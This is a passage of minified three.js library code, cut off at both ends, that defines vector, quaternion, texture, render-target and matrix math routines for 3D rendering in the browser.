this},lerpVectors:function(a,b,c){return this.subVectors(b,\na).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector2: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-\na.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};var Ze=0;ea.DEFAULT_IMAGE=void 0;ea.DEFAULT_MAPPING=300;ea.prototype={constructor:ea,isTexture:!0,set needsUpdate(a){!0===a&&this.version++},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.image=a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;\nthis.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=a.premultiplyAlpha;this.flipY=a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return this},toJSON:function(a){if(void 0!==a.textures[this.uuid])return a.textures[this.uuid];var b={metadata:{version:4.4,type:\"Texture\",generator:\"Texture.toJSON\"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,\nthis.offset.y],wrap:[this.wrapS,this.wrapT],minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY};if(void 0!==this.image){var c=this.image;void 0===c.uuid&&(c.uuid=N.generateUUID());if(void 0===a.images[c.uuid]){var d=a.images,e=c.uuid,f=c.uuid,g;void 0!==c.toDataURL?g=c:(g=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),g.width=c.width,g.height=c.height,g.getContext(\"2d\").drawImage(c,0,0,c.width,c.height));g=2048<g.width||2048<g.height?g.toDataURL(\"image/jpeg\",\n.6):g.toDataURL(\"image/png\");d[e]={uuid:f,url:g}}b.image=c.uuid}return a.textures[this.uuid]=b},dispose:function(){this.dispatchEvent({type:\"dispose\"})},transformUv:function(a){if(300===this.mapping){a.multiply(this.repeat);a.add(this.offset);if(0>a.x||1<a.x)switch(this.wrapS){case 1E3:a.x-=Math.floor(a.x);break;case 1001:a.x=0>a.x?0:1;break;case 1002:a.x=1===Math.abs(Math.floor(a.x)%2)?Math.ceil(a.x)-a.x:a.x-Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapT){case 1E3:a.y-=Math.floor(a.y);break;case 1001:a.y=\n0>a.y?0:1;break;case 1002:a.y=1===Math.abs(Math.floor(a.y)%2)?Math.ceil(a.y)-a.y:a.y-Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(ea.prototype,pa.prototype);fa.prototype={constructor:fa,isVector4:!0,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},\nsetComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?\na.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;\nreturn this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=\nthis.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=a[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},\nsetAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],m=a[9];c=a[2];b=a[6];var k=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>Math.abs(m-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(m+b)&&.1>Math.abs(e+h+k-3))return this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;k=(k+1)/2;d=(d+g)/4;f=(f+c)/4;m=(m+b)/4;e>h&&e>k?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>k?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),\nb=d/c,d=m/c):.01>k?(c=b=.707106781,d=0):(d=Math.sqrt(k),b=f/d,c=m/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-m)*(b-m)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-m)/a;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+k-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);\nthis.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));this.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new fa,b=new fa);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);\nreturn this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);\nreturn this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},\nsetLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=\n[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector4: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);this.w=a.getW(b);return this}};Ya.prototype={constructor:Ya,isWebGLRenderTarget:!0,setSize:function(a,b){if(this.width!==a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,\nb)},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.width=a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(Ya.prototype,pa.prototype);Gb.prototype=Object.create(Ya.prototype);Gb.prototype.constructor=Gb;Gb.prototype.isWebGLRenderTargetCube=!0;\nca.prototype={constructor:ca,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get w(){return this._w},set w(a){this._w=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},copy:function(a){this._x=\na.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return this},setFromEuler:function(a,b){if(!1===(a&&a.isEuler))throw Error(\"THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.\");var c=Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),m=a.order;\"XYZ\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*\ne-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"ZXY\"===m?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===m?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===m&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return this},setFromAxisAngle:function(a,b){var c=\nb/2,d=Math.sin(c);this._x=a.x*d;this._y=a.y*d;this._z=a.z*d;this._w=Math.cos(c);this.onChangeCallback();return this},setFromRotationMatrix:function(a){var b=a.elements,c=b[0];a=b[4];var d=b[8],e=b[1],f=b[5],g=b[9],h=b[2],m=b[6],b=b[10],k=c+f+b;0<k?(c=.5/Math.sqrt(k+1),this._w=.25/c,this._x=(m-g)*c,this._y=(d-h)*c,this._z=(e-a)*c):c>f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(m-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=.25*c,\nthis._z=(g+m)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+m)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new q);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=-1;this._y*=\n-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},multiply:function(a,\nb){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,m=b._z,k=b._w;this._x=c*k+f*g+d*m-e*h;this._y=d*k+f*h+e*g-c*m;this._z=e*k+f*m+c*h-d*g;this._w=f*k-c*g-d*h-e*m;this.onChangeCallback();return this},slerp:function(a,\nb){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=f,this._x=c,this._y=d,this._z=e,this;var h=Math.sqrt(1-g*g);if(.001>Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var m=Math.atan2(h,g),g=Math.sin((1-b)*m)/h,h=Math.sin(b*m)/h;this._w=f*g+this._w*h;this._x=\nc*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=a;return this},\nonChangeCallback:function(){}};Object.assign(ca,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],m=c[d+1],k=c[d+2];c=c[d+3];d=e[f+0];var l=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||m!==l||k!==p){f=1-g;var n=h*d+m*l+k*p+c*e,u=0<=n?1:-1,q=1-n*n;q>Number.EPSILON&&(q=Math.sqrt(q),n=Math.atan2(q,n*u),f=Math.sin(f*n)/q,g=Math.sin(g*n)/q);u*=g;h=h*f+d*u;m=m*f+l*u;k=k*f+p*u;c=c*f+e*u;f===1-g&&(g=1/Math.sqrt(h*h+m*m+k*k+c*c),h*=g,m*=g,k*=g,c*=g)}a[b]=h;a[b+\n1]=m;a[b+2]=k;a[b+3]=c}});q.prototype={constructor:q,isVector3:!0,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;case 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},\naddVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=\na.z-b.z;return this},multiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===(b&&\nb.isEuler)&&console.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new ca);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new ca);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},applyMatrix4:function(a){var b=\nthis.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this.divideScalar(a[3]*b+a[7]*c+a[11]*d+a[15])},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=a.w;var h=a*b+f*d-g*c,m=a*c+g*b-e*d,k=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+m*-g-k*-f;this.y=m*a+b*-f+k*-e-h*-g;this.z=k*a+b*-g+h*-f-m*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new S);a.multiplyMatrices(b.projectionMatrix,\na.getInverse(b.matrixWorld));return this.applyMatrix4(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new S);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyMatrix4(a)}}(),transformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/\na)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new q,b=new q);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,\nb)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},\nsetLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-\nd*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;this.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new q);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new q);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=\nthis.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(N.clamp(a,-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},distanceToManhattan:function(a){return Math.abs(this.x-a.x)+Math.abs(this.y-a.y)+Math.abs(this.z-a.z)},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},\nsetFromCylindrical:function(a){this.x=a.radius*Math.sin(a.theta);this.y=a.y;this.z=a.radius*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");\nvar c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector3: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);\nreturn this}};S.prototype={constructor:S,isMatrix4:!0,set:function(a,b,c,d,e,f,g,h,m,k,l,p,n,u,q,r){var A=this.elements;A[0]=a;A[4]=b;A[8]=c;A[12]=d;A[1]=e;A[5]=f;A[9]=g;A[13]=h;A[2]=m;A[6]=k;A[10]=l;A[14]=p;A[3]=n;A[7]=u;A[11]=q;A[15]=r;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},clone:function(){return(new S).fromArray(this.elements)},copy:function(a){this.elements.set(a.elements);return this},copyPosition:function(a){var b=this.elements;a=a.elements;\nb[12]=a[12];b[13]=a[13];b[14]=a[14];return this},extractBasis:function(a,b,c){a.setFromMatrixColumn(this,0);b.setFromMatrixColumn(this,1);c.setFromMatrixColumn(this,2);return this},makeBasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return this},extractRotation:function(){var a;return function(b){void 0===a&&(a=new q);var c=this.elements,d=b.elements,e=1/a.setFromMatrixColumn(b,0).length(),f=1/a.setFromMatrixColumn(b,1).length();b=1/a.setFromMatrixColumn(b,2).length();\nc[0]=d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return this}}(),makeRotationFromEuler:function(a){!1===(a&&a.isEuler)&&console.error(\"THREE.Matrix: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var b=this.elements,c=a.x,d=a.y,e=a.z,f=Math.cos(c),c=Math.sin(c),g=Math.cos(d),d=Math.sin(d),h=Math.cos(e),e=Math.sin(e);if(\"XYZ\"===a.order){a=f*h;var m=f*e,k=c*h,l=c*e;b[0]=g*h;b[4]=-g*e;b[8]=d;b[1]=m+\nk*d;b[5]=a-l*d;b[9]=-c*g;b[2]=l-a*d;b[6]=k+m*d;b[10]=f*g}else\"YXZ\"===a.order?(a=g*h,m=g*e,k=d*h,l=d*e,b[0]=a+l*c,b[4]=k*c-m,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=m*c-k,b[6]=l+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,m=g*e,k=d*h,l=d*e,b[0]=a-l*c,b[4]=-f*e,b[8]=k+m*c,b[1]=m+k*c,b[5]=f*h,b[9]=l-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,m=f*e,k=c*h,l=c*e,b[0]=g*h,b[4]=k*d-m,b[8]=a*d+l,b[1]=g*e,b[5]=l*d+a,b[9]=m*d-k,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,m=f*d,k=c*g,l=c*d,b[0]=\ng*h,b[4]=l-a*e,b[8]=k*e+m,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=m*e+k,b[10]=a-l*e):\"XZY\"===a.order&&(a=f*g,m=f*d,k=c*g,l=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+l,b[5]=f*h,b[9]=m*e-k,b[2]=k*e-m,b[6]=c*h,b[10]=l*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},makeRotationFromQuaternion:function(a){var b=this.elements,c=a.x,d=a.y,e=a.z,f=a.w,g=c+c,h=d+d,m=e+e;a=c*g;var k=c*h,c=c*m,l=d*h,d=d*m,e=e*m,g=f*g,h=f*h,f=f*m;b[0]=1-(l+e);b[4]=k-f;b[8]=c+h;b[1]=k+f;b[5]=1-(a+e);b[9]=\nd-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+l);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},lookAt:function(){var a,b,c;return function(d,e,f){void 0===a&&(a=new q,b=new q,c=new q);var g=this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;g[6]=b.z;g[10]=c.z;return this}}(),multiply:function(a,b){return void 0!==\nb?(console.warn(\"THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.\"),this.multiplyMatrices(a,b)):this.multiplyMatrices(this,a)},premultiply:function(a){return this.multiplyMatrices(a,this)},multiplyMatrices:function(a,b){var 